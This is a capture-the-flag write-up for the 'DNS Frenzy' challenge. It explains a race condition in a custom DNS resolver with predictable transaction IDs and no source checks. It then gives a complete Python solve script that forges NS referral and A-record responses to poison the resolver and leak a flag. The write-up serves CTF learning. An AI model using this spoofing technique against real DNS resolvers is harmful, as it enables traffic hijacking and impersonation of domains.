DNS Frenzy

```
🧩 Challenge Overview

We’re given a target DNS server at 34.134.162.213, with two key UDP ports:

17004 – used for DNS queries
17014 – used by the internal resolver to receive replies
```

# Recon & Analysis

After source recovery and analysis, we find this key snippet from `main.py`:
```py
http_comment = f"I like your subdomain: {FLAG}" if resolved_ip == '127.0.0.1' and internal_domain in qname else None
```

This shows that the flag is only leaked via a TXT record, and only when:

- The queried domain ends with dns_l3ak.ctf.itsbengsky.id
- The resolved IP is 127.0.0.1
- The subdomain matches rule

# Internal Access Control

In `core.py`, we find the resolver strictly enforces subdomain access:

```py
caller_hash = hashlib.sha256(caller.encode()).hexdigest()[0:63]
if domain.split(".")[0] != caller_hash:
    return None
```
So even if we query the correct internal domain, unless the subdomain matches our IP's hash, we won’t get anything.


# The Real Vulnerability — Race Condition in core.py

The heart of the vulnerability lies in the resolver’s packet handling logic. Consider this snippet from `resolver/core.py`:
```py
def send_query(self, tid: int, query: bytes, server_ip: str):
    with self.lock:
        if tid in self.responses:
            return self.responses.pop(tid)
        self.pending_tids.add(tid)

    time.sleep(3)
    self.sock.sendto(query, (server_ip, 53))

    start = time.time()
    while time.time() - start < 5:
        with self.lock:
            if tid in self.responses:
                response = self.responses.pop(tid)
                self.pending_tids.discard(tid)
                return response
```
And from the listener thread:
```py
def _listen_loop(self):
    while True:
        res, _ = self.sock.recvfrom(512)
        tid = int.from_bytes(res[:2], byteorder='big')
        with self.lock:
            if tid not in self.pending_tids or tid in self.responses:
                continue
            self.responses[tid] = res
            self.pending_tids.remove(tid)
```

## Why This is a Race Condition
- The resolver accepts any UDP response to its internal port (53535, exposed externally via 17014) as long as the TID matches a pending query.
- It does not validate the source IP.
- If we can predict the TID (which is generated from a known MD5 hash of our IP and timestamp), we can forge a response and win the race against the real upstream server.

# Exploitation Strategy
- Predict TID based on:
```py
md5(f"{caller}_{timestamp}")[:2]
```
- Send a real DNS query for the internal domain, triggering outbound recursive resolution.
- Race the resolver with:
- - A fake NS referral pointing to 127.0.0.1
- - A fake A record resolving the internal subdomain to 127.0.0.1
- Query the TXT record — the server thinks the internal domain belongs to you and reveals the flag.

Exploit Script Summary
solve.py
```py
import hashlib
import struct
import time
import socket
import subprocess
import random

TARGET = "34.134.162.213"
PORT_DNS_QUERY = 17004
PORT_RESOLVER_LISTEN = 17014
CALLER = "YOUR PUBLIC IP ADDRESS"  # Replace with your real IP

INTERNAL_BASE = "dns_l3ak.ctf.itsbengsky.id"
FAKE_NS = "xixixi"
FAKE_NS_IP = "127.0.0.1"

def get_internal_domain():
    caller_hash = hashlib.sha256(CALLER.encode()).hexdigest()[:63]
    return f"{caller_hash}.{INTERNAL_BASE}"

def get_tid():
    """Predicts TID based on timestamp and caller IP."""
    timestamp = int(time.time()) // 0.2
    data = f"{CALLER}_{timestamp}".encode()
    hash_bytes = hashlib.md5(data).digest()
    tid = struct.unpack("!H", hash_bytes[:2])[0]
    print(f"[+] Predicted TID = {tid} for data = {data}")
    return tid

def encode_qname(domain):
    return b''.join([bytes([len(part)]) + part.encode() for part in domain.split('.')]) + b'\x00'

def build_dns_query(tid, domain):
    header = struct.pack("!H", tid) + b"\x01\x00"  # Standard query
    header += b"\x00\x01" + b"\x00\x00" * 3       # QDCOUNT = 1, others = 0
    qname = encode_qname(domain)
    return header + qname + struct.pack("!HH", 1, 1)  # Type A, Class IN

def build_ns_response(tid, qdomain):
    pkt = struct.pack("!H", tid) + b"\x81\x80"
    pkt += b"\x00\x01"  # QDCOUNT
    pkt += b"\x00\x00"  # ANCOUNT
    pkt += b"\x00\x01"  # NSCOUNT
    pkt += b"\x00\x01"  # ARCOUNT

    pkt += encode_qname(qdomain) + struct.pack("!HH", 1, 1)

    # Authority section (NS record)
    pkt += encode_qname(qdomain)
    pkt += struct.pack("!HHI", 2, 1, 300)  # NS type
    ns_encoded = encode_qname(FAKE_NS)
    pkt += struct.pack("!H", len(ns_encoded)) + ns_encoded

    # Additional section (A record for FAKE_NS)
    pkt += encode_qname(FAKE_NS)
    pkt += struct.pack("!HHI", 1, 1, 300)
    pkt += struct.pack("!H", 4) + socket.inet_aton(FAKE_NS_IP)

    return pkt

def build_final_response(tid, domain):
    pkt = struct.pack("!H", tid) + b"\x81\x80"
    pkt += b"\x00\x01"  # QDCOUNT
    pkt += b"\x00\x01"  # ANCOUNT
    pkt += b"\x00\x00" * 2  # NSCOUNT, ARCOUNT

    pkt += encode_qname(domain) + struct.pack("!HH", 1, 1)

    # Answer section
    pkt += encode_qname(domain)
    pkt += struct.pack("!HHI", 1, 1, 300)
    pkt += struct.pack("!H", 4) + socket.inet_aton("127.0.0.1")

    return pkt

def send_packet(packet, port):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(packet, (TARGET, port))

def send_real_query(domain, tid):
    print(f"[+] Sending real DNS query for {domain}")
    send_packet(build_dns_query(tid, domain), PORT_DNS_QUERY)

def send_forged_ns_response(tid, domain):
    print(f"[+] Sending forged NS referral for {domain}")
    send_packet(build_ns_response(tid, domain), PORT_RESOLVER_LISTEN)

def send_forged_final_response(tid, domain):
    print(f"[+] Sending forged A record for {domain}")
    send_packet(build_final_response(tid, domain), PORT_RESOLVER_LISTEN)

def get_txt_flag(domain):
    print(f"[+] Querying TXT record for {domain}")
    try:
        output = subprocess.check_output(
            ["dig", f"@{TARGET}", "-p", str(PORT_DNS_QUERY), domain, "TXT"],
            stderr=subprocess.DEVNULL
        ).decode()
        print("\n[+] DNS TXT Response:\n" + output)
    except subprocess.CalledProcessError:
        print("[-] Failed to get TXT record")

def main():
    internal_domain = get_internal_domain()
    external_domain = INTERNAL_BASE
    tid = get_tid()

    send_real_query(external_domain, tid)

    time.sleep(1.2)
    send_forged_ns_response(tid, external_domain)

    time.sleep(8)
    for _ in range(100):
        send_forged_ns_response(tid, internal_domain)

    time.sleep(2)
    for _ in range(100):
        send_forged_final_response(tid, internal_domain)

    for _ in range(50):
        time.sleep(1)
        get_txt_flag(internal_domain)

if __name__ == "__main__":
    main()

```

## Key actions:
- send_real_query() — starts the legit resolution
- send_forged_ns_response() — injects fake NS record (points to 127.0.0.1)
- send_forged_final_response() — injects fake A record
- get_txt_flag() — finally queries the TXT record and reveals the flag